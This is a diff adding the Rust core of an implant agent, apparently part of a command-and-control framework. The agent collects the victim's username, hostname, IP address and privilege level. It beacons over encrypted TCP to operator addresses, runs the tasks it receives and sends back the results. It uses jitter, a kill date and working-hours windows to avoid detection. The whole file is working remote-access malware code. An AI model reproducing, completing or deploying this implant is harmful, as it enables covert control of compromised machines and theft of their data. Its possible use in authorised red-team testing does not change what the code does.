@@ -1,0 +1,252 @@
+use crate::commander;
+use crate::connector_tcp::ConnectorTCP;
+use crate::crypto;
+use crate::protocol;
+use rand::rngs::OsRng;
+use rand::RngCore;
+use std::net::{TcpStream, UdpSocket};
+use std::path::Path;
+use std::thread;
+use std::time::{Duration, SystemTime, UNIX_EPOCH};
+
+pub struct Agent {
+    pub active: bool,
+    pub profile: protocol::Profile,
+    pub session_key: Vec<u8>,
+    pub sleep_secs: i32,
+    pub jitter: i32,
+    pub kill_date: i64,
+    pub work_start: i32,
+    pub work_end: i32,
+    pub burst_enabled: i32,
+    pub burst_sleep: i32,
+    pub burst_jitter: i32,
+    pub chunk_size: i32,
+    pub connector: ConnectorTCP,
+}
+
+impl Agent {
+    pub fn new(profile: protocol::Profile) -> Self {
+        let mut session_key = vec![0u8; crypto::KEY_SIZE];
+        OsRng.fill_bytes(&mut session_key);
+
+        Self {
+            active: true,
+            sleep_secs: if profile.sleep > 0 { profile.sleep } else { 5 },
+            jitter: profile.jitter,
+            kill_date: profile.kill_date,
+            work_start: profile.work_start,
+            work_end: profile.work_end,
+            burst_enabled: 0,
+            burst_sleep: 0,
+            burst_jitter: 0,
+            chunk_size: 0,
+            connector: ConnectorTCP::new(profile.clone()),
+            profile,
+            session_key,
+        }
+    }
+
+    pub fn run(&mut self) {
+        if self.profile.addresses.is_empty() {
+            return;
+        }
+
+        let mut index = 0usize;
+        while self.active {
+            if self.should_exit() {
+                break;
+            }
+            self.wait_for_working_hours();
+
+            let addr = self.profile.addresses[index % self.profile.addresses.len()].clone();
+            index += 1;
+
+            match self.connector.connect_to(&addr) {
+                Ok(mut stream) => {
+                    if self.send_init(&mut stream).is_ok() {
+                        self.task_loop(&mut stream);
+                    }
+                }
+                Err(_) => {}
+            }
+
+            self.sleep_with_jitter();
+        }
+    }
+
+    fn send_init(&self, stream: &mut TcpStream) -> Result<(), String> {
+        let beat = protocol::marshal(&self.create_info())?;
+        let init = protocol::marshal(&protocol::InitPack {
+            id: self.random_u32(),
+            r#type: self.profile.r#type,
+            data: beat,
+        })?;
+        let start = protocol::marshal(&protocol::StartMsg {
+            id: protocol::INIT_PACK,
+            data: init,
+        })?;
+        let enc = crypto::encrypt(&start, &self.session_key).map_err(|e| e.to_string())?;
+        protocol::tcp_send_msg(stream, &enc).map_err(|e| e.to_string())
+    }
+
+    fn task_loop(&mut self, stream: &mut TcpStream) {
+        while self.active {
+            if self.should_exit() {
+                break;
+            }
+            self.wait_for_working_hours();
+
+            let data = match protocol::tcp_recv_msg(stream) {
+                Ok(data) if !data.is_empty() => data,
+                _ => break,
+            };
+
+            let plain = match crypto::decrypt(&data, &self.session_key) {
+                Ok(plain) => plain,
+                Err(_) => break,
+            };
+
+            let message: protocol::Message = match protocol::unmarshal(&plain) {
+                Ok(msg) => msg,
+                Err(_) => break,
+            };
+
+            if message.r#type != 1 {
+                self.sleep_with_jitter();
+                continue;
+            }
+
+            let responses = commander::process_tasks(self, &message.object);
+            if responses.is_empty() {
+                self.sleep_with_jitter();
+                continue;
+            }
+
+            let out = match protocol::marshal(&protocol::Message {
+                r#type: 1,
+                object: responses,
+            }) {
+                Ok(out) => out,
+                Err(_) => break,
+            };
+
+            let enc = match crypto::encrypt(&out, &self.session_key) {
+                Ok(enc) => enc,
+                Err(_) => break,
+            };
+
+            if protocol::tcp_send_msg(stream, &enc).is_err() {
+                break;
+            }
+
+            self.sleep_with_jitter();
+        }
+    }
+
+    pub fn sleep_with_jitter(&self) {
+        let base_ms = self.sleep_secs.max(0) as u64 * 1000;
+        let jitter = self.jitter.clamp(0, 90) as u64;
+        let actual_ms = if jitter == 0 {
+            base_ms
+        } else {
+            let delta = base_ms * jitter / 100;
+            let spread = delta.saturating_mul(2).saturating_add(1);
+            let roll = (self.random_u32() as u64) % spread;
+            base_ms.saturating_sub(delta).saturating_add(roll)
+        };
+        thread::sleep(Duration::from_millis(actual_ms.max(100)));
+    }
+
+    pub fn should_exit(&self) -> bool {
+        self.kill_date > 0 && self.now_unix() >= self.kill_date
+    }
+
+    pub fn wait_for_working_hours(&self) {
+        if self.work_start == 0 && self.work_end == 0 {
+            return;
+        }
+
+        loop {
+            let now = SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .unwrap_or_default()
+                .as_secs();
+            let hhmm = ((now % 86400) / 3600) as i32 * 100 + (((now % 86400) % 3600) / 60) as i32;
+            let in_window = if self.work_start <= self.work_end {
+                hhmm >= self.work_start && hhmm < self.work_end
+            } else {
+                hhmm >= self.work_start || hhmm < self.work_end
+            };
+            if in_window {
+                return;
+            }
+            thread::sleep(Duration::from_secs(60));
+        }
+    }
+
+    fn create_info(&self) -> protocol::SessionInfo {
+        protocol::SessionInfo {
+            process: self.process_name(),
+            pid: std::process::id() as i32,
+            user: std::env::var("USER").or_else(|_| std::env::var("USERNAME")).unwrap_or_default(),
+            host: hostname(),
+            ipaddr: local_ipv4(),
+            elevated: is_elevated(),
+            acp: 65001,
+            oem: 65001,
+            os: std::env::consts::OS.to_string(),
+            os_version: std::env::consts::OS.to_string(),
+            encrypt_key: self.session_key.clone(),
+        }
+    }
+
+    fn process_name(&self) -> String {
+        std::env::current_exe()
+            .ok()
+            .as_deref()
+            .and_then(Path::file_name)
+            .map(|s| s.to_string_lossy().to_string())
+            .unwrap_or_else(|| "__NAME__".to_string())
+    }
+
+    fn random_u32(&self) -> u32 {
+        let mut buf = [0u8; 4];
+        OsRng.fill_bytes(&mut buf);
+        u32::from_be_bytes(buf)
+    }
+
+    fn now_unix(&self) -> i64 {
+        SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_secs() as i64
+    }
+}
+
+fn hostname() -> String {
+    std::env::var("COMPUTERNAME")
+        .or_else(|_| std::env::var("HOSTNAME"))
+        .unwrap_or_default()
+}
+
+fn local_ipv4() -> String {
+    UdpSocket::bind("0.0.0.0:0")
+        .and_then(|sock| {
+            sock.connect("8.8.8.8:80")?;
+            sock.local_addr()
+        })
+        .map(|addr| addr.ip().to_string())
+        .unwrap_or_default()
+}
+
+fn is_elevated() -> bool {
+    #[cfg(unix)]
+    {
+        unsafe { libc::geteuid() == 0 }
+    }
+    #[cfg(not(unix))]
+    {
+        false
+    }
+}
